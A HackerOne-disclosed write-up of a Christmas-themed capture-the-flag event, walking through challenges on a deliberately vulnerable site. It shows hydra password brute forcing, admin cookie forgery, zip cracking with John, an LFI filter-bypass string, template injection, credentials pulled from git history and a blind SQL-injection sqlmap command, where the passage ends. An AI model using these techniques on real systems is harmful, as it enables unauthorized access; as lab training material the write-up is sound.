# First CTF ever!

## Report Details
- **Report ID**: 1069263
- **URL**: https://hackerone.com/reports/1069263
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-31T12:42:07.334Z
- **Disclosed**: 2021-01-12T17:55:33.038Z

## Reporter
- **Username**: eliee
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
# Pretext
Started looking into hacking this autumn and then found out HackerOne was doing a Christmas themed CTF. Further investigation showed that the deplorable Grinch might be up to no good again - Christmas is in danger!

# TLDR
Lots of hacking took place, the Grinch was stopped, Christmas saved and all I got for the trouble was these flags (and lots of invites but no Snow Ball Launcher):
```text
flag{48104912-28b0-494a-9995-a203d1e261e7}
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
flag{b705fb11-fb55-442f-847f-0931be82ed9a}
flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
flag{99309f0f-1752-44a5-af1e-a03e4150757d}
flag{07a03135-9778-4dee-a83c-7ec330728e72}
flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
```

## First look
A first look at the domain in scope (https://hackyholidays.h1ctf.com/) for the CTF reveals the Grinch network's front to the world, a homepage with nothing but a picture.

{F1138471}

Taking a quick look at `https://hackyholidays.h1ctf.com/robots.txt` to see if there's anything they don't want robots (us) to see, we find the first flag `flag{48104912-28b0-494a-9995-a203d1e261e7}` and that bots aren't allowed to index `/s3cr3t-ar3a`.

## Secret area
The supposedly secret area of the Grinch doesn't really give a lot of information other than it has been moved to another secure location in order to "Keep people out". 
(https://hackyholidays.h1ctf.com/s3cr3t-ar3a)
{F1138470}

Inspecting the page with Chrome's developer tools reveals the second flag `flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`, hidden in a div tag:
{F1138472}

This flag is not visible in the HTML returned by the HTTP request to /s3cr3t-ar3a so it must be hidden in JavaScript somewhere. Further investigation reveals a script tag loading `https://hackyholidays.h1ctf.com/assets/js/jquery.min.js` and inside, we find  the following code:

```javascript
		h1_0 = 'la'
      , h1_1 = '}'
      , h1_2 = ''
      , h1_3 = 'f'
      , h1_4 = 'g'
      , h1_5 = '{b7ebcb75'
      , h1_6 = '8454-'
      , h1_7 = 'cfb9574459f7'
      , h1_8 = '-9100-4f91-';
    document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
```

Running just the variables `h1_0` through `h1_8` in `console.log` gives us the flag:
```javascript
console.log( h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
// flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
```

The very same page also provides a hint at which the next page will be:
```javascript
document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
```

## next-page - /apps
The `/apps` endpoint currently (as of writing) provides us with a list of 8 different challenges presented as separate apps. The page itself doesn't hold any flags or vulnerabilities.

(https://hackyholidays.h1ctf.com/apps)

## /people-rater - the third flag
The first of the apps is the "Grinch People Rater". It provides a list of names which, when clicked, presents the Grinch's opinion on that particular person.

{F1138473}

{F1138474}

Inspecting the webpage tells us that each and every button has an associated data-id attribute. Tea Avery, for example, has the id `eyJpZCI6Mn0=`. Hmm, looks like base64 - let's have a look!

```javascript
atob('eyJpZCI6Mn0=');
```
```json
{
  "id":2
}
```

Oh, nice, a JSON-object providing us with an id, makes sense that it star... wait a minute. Why would it start with id 2? Who is id 1? Just have to check! Enter the following into the browser's console:

```javascript
// encode {"id":1}
const o = btoa('{"id":1}');
// eyJpZCI6MX0=
```

Now, how are people fetched? Source inspection tells us a request is made to `https://hackyholidays.h1ctf.com/people-rater/entry?id=IDHERE`
Let's plug our encoded object into it and see what it returns!
```javascript
fetch(`https://hackyholidays.h1ctf.com/people-rater/entry?id=${o}`).then(d => d.text()).then(d => console.log(d));
```
```JSON
{
  "id":"eyJpZCI6MX0=",
  "name":"The Grinch",
  "rating":"Amazing in every possible way!",
  "flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
}
```

Sweet, the third flag is `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`!

## /swag-shop - the fourth flag
Ah, the swag-shop - I wonder who'd actually be shopping from here. They have only three items, none of them with pictures, and while the 'Snow Ball Launcher' does appeal to me, $395 seems rather steep...

{F1138475}

That said, let's try purchasing it! Wait, I need to log in to buy it?
{F1138477}

No way to register a user, no obvious credentials work... Hmm. Let's look at the source, then - I want that launcher!

The source code reveals there is some sort of API at `https://hackyholidays.h1ctf.com/swag-shop/api/` as the page pulls stock from `https://hackyholidays.h1ctf.com/swag-shop/api/stock`. There's also `https://hackyholidays.h1ctf.com/swag-shop/api/login` and  `https://hackyholidays.h1ctf.com/swag-shop/api/purchase`. Neither seem to want to accept my money so let's break out the fuzzer and see what other endpoints are available to us.

```bash
ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -w 
seclists/Discovery/Web-Content/common.txt
```

Reveals another, previously unknown, endpoint: `https://hackyholidays.h1ctf.com/swag-shop/api/sessions`

Accessing the `/sessions` endpoint gives us a JSON object with quite a few sessions:

```JSON
{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
```

They all seem to be base64 encoded, let's have a look at the first one:
```javascript
atob("eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=");
// {"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="}"
```

Hmm, a null user... Doing this by hand seems like a chore, let's automate it:
```javascript
fetch("https://hackyholidays.h1ctf.com/swag-shop/api/sessions")
  .then(d => d.json())
  .then(d => {
    d.sessions.forEach(obj => {
      console.log(atob(obj))
    })
  });
```

Result:
```JSON
{"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="}
{"user":null,"cookie":"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="}
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
{"user":null,"cookie":"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="}
{"user":null,"cookie":"M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="}
{"user":null,"cookie":"MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="}
{"user":null,"cookie":"MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="}
{"user":null,"cookie":"OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="}
```

Aha, a valid user by the looks of it - `C7DCCE-0E0DAB-B20226-FC92EA-1B9043`! But it doesn't give us a proper username, and the cookie property seems to decode into a hash... Maybe we can use the user id? And since it so sincerely tells us "user", maybe there is a `https://hackyholidays.h1ctf.com/swag-shop/api/user` endpoint?
{F1138476}

Look at that! Now, what might the actual parameter be? user, id, userid, username? Nope:
{F1138478}

Thinking about it, the user"name" returned by `https://hackyholidays.h1ctf.com/swag-shop/api/sessions` does look more like a UUID than a name or regular id... maybe `uuid` will work? 
[Link](https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043)
{F1138479}

```JSON
{
	"uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
	"username": "grinch",
	"address": {
		"line_1": "The Grinch",
		"line_2": "The Cave",
		"line_3": "Mount Crumpit",
		"line_4": "Whoville"
	},
	"flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```

Sweet, the fouth flag `flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`! Unfortunately, it doesn't seem like it will let us buy a Snow Ball Launcher - better stop the Grinch and ask Santa for one!

## /secure-login - the fifth flag
We are greeted with a page that fits the location to a T.
{F1138480}

And yet again, no way to sign up >:( Maybe there's some hidden sign up page... Apparently not - fuzzing reveals nothing of interest. Let's try logging in, then!
`test:test`
{F1138481}

No dice, go... Wait, *username* doesn't exist? Perhaps it will tell us when we find a proper username, let's try running hydra.
```bash
hydra -L /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -p wot 18.216.153.32 https-post-form '/secure-login:username=^USER^&password=^PASS^:Invalid Username'
[...]
[443][http-post-form] host: 18.216.153.32   login: access   password: wot
```

Nice, seems the page properly informs us that the username `access` is valid by saying the password is incorrect:
{F1138485}

Let's use hydra again to see if we can get the password too:
```bash
hydra -l access -P /usr/share/wordlists/rockyou.txt 18.216.153.32 https-post-form '/secure-login:username=^USER^&password=^PASS^:Invalid Password'
[443][http-post-form] host: 18.216.153.32   login: access   password: computer
1 of 1 target successfully completed, 1 valid password found
```
Bingo, `computer`. After logging in using `access:computer` as credentials, we are greeted with the following, very informative, message:
{F1138486}

Looking at the source also gives us nothing, but I noticed that the cookie in the HTTP request seems to be a base64 encoded value:

{F1138488}

```javascript
atob(decodeURIComponent("eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D"));
// {"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```

Apparently, we don't have admin privileges... But it does look like we can change that:
```javascript
encodeURIComponent(btoa('{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}'));
// eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3D%3D
```

Using Burp, we send the request for `https://hackyholidays.h1ctf.com/secure-login` to the repeater and change the value of the `securelogin` cookie to our new forged JSON object before hitting `Send`:
{F1138487}

Seems there's a hidden zip-file that the Grinch doesn't want us to have! Let's get it from [here](https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip)!

Opening the file, it turns out it has been password protected:
{F1138490}

Surely, this is nothing before the might of John the Ripper, particularly since we'll be cracking locally!

First, we'll need to convert it to a format that John can understand.
```bash
zip2john my_secure_files_not_for_you.zip > zippass.txt
```

Next, let John loose on the hash retrieved from the zip-file, using the infamous password list `rockyou.txt`! 
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zippass.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hahahaha         (my_secure_files_not_for_you.zip)
1g 0:00:00:00 DONE (2020-12-29 11:21) 25.00g/s 409600p/s 409600c/s 409600C/s 123456..cocoliso
Warning: passwords printed above might not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Seems like `hahahaha` is the password we're looking for. Providing that as a password when extracting `flag.txt` from the zip-file gives us access to the fifth flag `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`: 
{F1138491}


## /my-diary - the sixth flag
Seems like the Grinch has been keeping a diary - I wonder if he's written anything about his upcoming plans to ruin Christmas for everyone?

{F1138492}

A first look doesn't reveal anything of particular interest bar the fact that he is planning to ruin Christmas on the 25th... Oh, and it seems as if his diary might be vulnerable to LFI attacks since the address bar looks like this:
{F1138494}

Let's see what happens if we try to include `index.php` by visiting https://hackyholidays.h1ctf.com/my-diary/index.php?template=index.php:
{F1138493}

A blank page. Huh. But is it, though? Let's have a look at the Networks tab of the browser:

{F1138495}

Turns out, the page is vulnerable to LFI and we have gotten the source code of the `index.php` file.

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

By the looks of it, there is a secret admin page located at `https://hackyholidays.h1ctf.com/my-diary/secretadmin.php`. Unfortunately, the file isn't directly accessible:
{F1138496}
And trying to have `index.php` retrieve it through the `template` parameter seems undoa... No, it should actually be doable given the right string composition.

First up, the webpage filters anything that is not part of the charset 
```javascript
/[A-Za-z0-9.]/
```
As such, we are limited to A-Z, a-z, 0-9 and .

Next, using `str_replace` it removes `admin.php`, followed by removing any occurrences of `secretadmin.php`. This approach seems secure but it is not - PHP does an initial search of all occurrences  of `admin.php` and then only removes those before doing the same thing for `secretadmin.php`! 

The PHP documentation for [str_replace](https://php.net/str_replace) states the following:
{F1138497}

This means that if we put, say, `adminadmin.php.php` through the filter `str_replace("admin.php", "", $page)`, we will be left with `admin.php`. We can quickly confirm this is the case by running the following PHP code by using `php -a`

```php
php > $a = "adminadmin.php.php";
php > print str_replace("admin.php", "", $a);
admin.php
```

As such, we can construct the following string to avoid all filters: `secretsecretadminadmin.php.phpadminadmin.php.php`

```php
php > $a = "secretsecretadminadmin.php.phpadminadmin.php.php";
php > print str_replace("secretadmin.php", "", str_replace("admin.php", "", $a));
secretadmin.php
```

By visiting https://hackyholidays.h1ctf.com/my-diary/index.php?template=secretsecretadminadmin.php.phpadminadmin.php.php we get the contents of the `secretadmin.php` file, including the sixth flag `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`:
{F1138499}

Also, it seems the Grinch is planning to DDoS Santa's servers on the 23rd!

## /hate-mail-generator - the seventh flag
Apparently, the Grinch has been hard at work trying to upset people by sending them hate mail. The initial page looks like below and has a single campaign:
{F1138501}

The campaign itself looks like so:
{F1138500}

Looks like he's using a template engine to include HTML files in his outgoing hate mail - let's leave this potential SSTI for now and come back to it later.

We can create our own campaign by clicking on the [Create New](https://hackyholidays.h1ctf.com/hate-mail-generator/new) button on the front page. The `New Campaign` page looks like so:
{F1138502}
with source code as follows (irrelevant outer markup omitted):
```html
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center">New Campaign</h1>
    <div class="row">
        <div class="col-md-6 col-md-offset-3">
                       <form method="post">
            <div class="panel panel-default" style="margin-top:50px">
                <div class="panel-heading">New Campaign</div>
                <div class="panel-body">
                    <div><label>Name:</label></div>
                    <div><input class="form-control" name="name" value=""></div>
                    <div style="margin-top:7px"><label>Subject:</label></div>
                    <div><input class="form-control" name="subject"></div>
                    <div style="margin-top:7px"><label>Markup:</label></div>
                    <div><textarea name="markup" class="form-control" rows="15">Hello {{name}} ....</textarea></div>
                </div>
            </div>
            <div>
                <input type="button" class="btn btn-primary preview-campaign" value="Preview">
                <input type="submit" class="btn btn-success pull-right" value="Create">
            </div>
            </form>
        </div>
    </div>
</div>
<form method="post" action="/hate-mail-generator/new/preview" id="previewfrm" target="_blank">
    <input type="hidden" name="preview_markup">
    <input type="hidden" name="preview_data" value='{"name":"Alice","email":"alice@test.com"}'>
</form>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<script>
    $('.preview-campaign').click( function(){
        $('input[name="preview_markup"]').val( $('textarea[name="markup"]').val(  ) )
        $('form#previewfrm').submit();
    });
</script>
```

Apparently, if we preview the page ([link](https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview)) we will do so using mockup name and email for 'Alice' (alice@test.com). Previewing the premade mail template, it does say hello to Alice:
{F1138503}

Knowing that we can inject random data through `{{}}` and actually have the page process it through the preview function, let's see what juicy files we can dig up to use with `{{template:}}` .

Let's fuzz!
```bash
ffuf -u https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
```

Templates looks to be just what we're looking for!
```bash
curl https://hackyholidays.h1ctf.com/hate-mail-generator/templates/
<html>
<head><title>Index of /hate-mail-generator/templates/</title></head>
<body bgcolor="white">
<h1>Index of /hate-mail-generator/templates/</h1><hr><pre><a href="../">../</a>
<a href="cbdj3_grinch_header.html">cbdj3_grinch_header.html</a>                                     20-Apr-2020 10:00                   -
<a href="cbdj3_grinch_footer.html">cbdj3_grinch_footer.html</a>                                     20-Apr-2020 10:00                   -
<a href="38dhs_admins_only_header.html">38dhs_admins_only_header.html</a>                                21-Apr-2020 15:29                  46
</pre><hr></body>
</html>
```

Nice, a list of usable templates. Naturally, we'll try accessing `38dhs_admins_only_header.html` first:
```bash
curl https://hackyholidays.h1ctf.com/hate-mail-generator/templates/38dhs_admins_only_header.html
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.15.8</center>
</body>
</html>
```

Well, I don't think anyone actually expected that to work. Let's get back to the new campaign page at `/hate-mail-generator/new` and see what we can cook up!

{F1138504}

Let's preview and win!
{F1138505}

SUCCE... ?! What? Apparently, not so easy. But, we know the two parameters to the preview function - `preview_markup`and `preview_data` from the source code of the `new` page. Maybe we can trick the page into including the admin-page by providing it as a variable in `preview_data` and then reflecting that variable in `preview_markup`. Let's craft `preview_data` to look like so:
```json
{
  "name":"Alice",
  "email":"alice@test.com",
  "winner":"{{template:38dhs_admins_only_header.html}}"
}
 ```

Next, let's modify `preview_markup` to include our new `winner` property:
```text
{{winner}}
```

Let's run the request using the following JavaScript from the debug console (press F12) on https://hackyholidays.h1ctf.com/hate-mail-generator/:
```javascript
const previewData = '{"name":"Alice","email":"alice@test.com","winner":"{{template:38dhs_admins_only_header.html}}"}';
const previewMarkup = '{{winner}}';

const formData = new FormData();
formData.append('preview_markup', previewMarkup);
formData.append('preview_data', previewData);
const body = new URLSearchParams(formData);

fetch('https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview', { method: 'POST', body: new URLSearchParams(formData), headers: { 'content-type':'application/x-www-form-urlencoded'} }).then(d => d.text()).then(d => console.log(d));
```

This gives us the following response, including the seventh flag `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`: 
```html
<html>
<body>
<center>
    <table width="700">
        <tr>
            <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Grinch Network Admins Only</td>
        </tr>
        <tr>
            <td style="padding:20px 10px 20px 10px">
                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
```

Sweet! While we haven't really stopped any emails from going out, we have at least managed to access the admin page!

## /forum - the eight flag
Ah yes, because what webpage is complete without a forum to gloat in! There doesn't seem to be anyone active in the forums except for the Grinch himself and Max the dog, though ...

{F1138506}

Looking through the forums and fuzzing `https://hackyholidays.h1ctf.com/forum/` doesn't actually reveal anything interesting apart from a `/phpmyadmin` endpoint that seems to be completely unwilling to do anything without proper papers...

```bash
ffuf -u https://hackyholidays.h1ctf.com/forum/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
1                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]
phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
```

Enter twitter:
{F1138507}
Until I saw this tweet, I had no idea about who had actually created the CTF but this gave me an idea - maybe, just maybe, the source is available on GitHub. Let's have a look!

Searching google for `site:github.com adamtlangley grinch` gives a single result:
{F1138509}

\* **An hour of source code review later** * 

The forums don't seem to be vulnerable to any particular type of attack, and I can't find any vector to defeat the session hash without actually having an account. Looking at the source for the DB class, I noticed there was no user or password specified for accessing the database.

```php
class Db {

    static private $read = '';
    static private $write = '';

    /**
     * @return PDO
     */
    static public function read(){
        if( gettype(self::$read) == 'string' ) {
            self::$read = new DbConnect( false, '', '','' );
        }
        return self::$read;
    }

    public static function closeAll(){
        self::$read = null;
        self::$write = null;
    }

    /**
     * @return PDO
     */
    static public function write(){
        if( gettype(self::$write) == 'string' ) {
            self::$write = new DbConnect( true,  '', '','' );
        }
        return self::$write;
    }
}
```

Strange, I thought to myself...  Maybe they entered them later, straight on the server? Or maybe... they have a previous commit disclosing the information?!
{F1138510}

Aha! Looking at the older commit ('Initial Code Commit'), bingo:
```php
static public function read(){
        if( gettype(self::$read) == 'string' ) {
            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
        }
        return self::$read;
    }
```

We know from the `DB::__construct` method that the order is `$write, $db, $db_user, $db_pass`:
```php
public function __construct($write, $db, $db_user, $db_pass ){
        $this->write = $write;
        $this->db = $db;
        $this->db_user = $db_user;
        $this->db_pass = $db_pass;
        $this->reconnect();
    }
```

Plugging "our" credentials into the login box at https://hackyholidays.h1ctf.com/forum/phpmyadmin, we are shown the following page detailing database structure:
{F1138511}

Only the `user` table actually returns any data of interest:
{F1138512}

Hmm, looks like the passwords might be MD5-hashed... Let's plug the Grinch's password hash into [CrackStation](crackstation.net):
{F1138513}

Sweet, his password is `BahHumbug`. Now let's log into the forums from https://hackyholidays.h1ctf.com/forum/login using `grinch:BahHumbug` as our credentials:
{F1138514}

{F1138515}

Oh no, it seems like the Grinch is really going to go through with DDoSing Santa!

At least we got the eight flag, `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`.

## /evil-quiz - the ninth flag
As the name implies, the quiz is evil. To the untrained (my) eye, it is just another webpage quiz. You can (I did) spend hours upon hours staring at until it dawns on you (me) that there is something peculiar about how many other players of the same name there are participating in the quiz...

{F1138516}

After testing about with SQLi, XSS, brute force on the admin login, trying to forge and guess session variables and what not, I noticed this interesting part on the score page after updating my name with some random SQLi (`myuniquename' or 1=1 -- `):

{F1138517}

Huh, seems like we have ourselves an SQLi that might be used as a boolean. Let's confirm by altering the name to `myuniquename' or 1=2 -- `:
{F1138518}

Yup, definitely is vulnerable to a blind boolean based SQLi. I saved the HTTP POST request to `https://hackyholidays.h1ctf.com/evil-quiz` used to set the name variable from Burp suite as `quiz.req` and fired up sqlmap with the following options (note: sqlmap needs the request to have the cookie `session` set to a hash that has completed the quiz at least once!):

```bash
sqlmap -r ../quiz.req --second-url=https://hackyholidays.h1ctf.com/evil-quiz/score --level=5 --risk=3 --not-string=" 0 other" -p name --dbs --tables --thread=4
```

